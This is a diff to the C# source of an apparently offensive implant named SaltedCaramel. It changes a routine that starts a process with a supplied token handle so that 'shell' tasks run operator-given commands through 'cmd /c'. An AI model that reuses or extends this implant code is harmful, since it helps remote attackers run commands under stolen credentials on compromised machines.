@@ -32,9 +32,21 @@ namespace SaltedCaramel
         /// <param name="TokenHandle"></param>
         internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
         {
-            string[] split = task.@params.Trim().Split(' ');
-            string argString = string.Join(" ", split.Skip(1).ToArray());
-            string file = split[0];
+            string[] split;
+            string argString;
+            string file;
+            if (task.command == "shell")
+            {
+                split = task.@params.Trim().Split(' ');
+                argString = string.Join(" ", split);
+                file = "cmd /c";
+            }
+            else
+            {
+                split = task.@params.Trim().Split(' ');
+                argString = string.Join(" ", split.Skip(1).ToArray());
+                file = split[0];
+            }
             // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
             Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
             // STARTUPINFO is used to control a few startup options for our new process
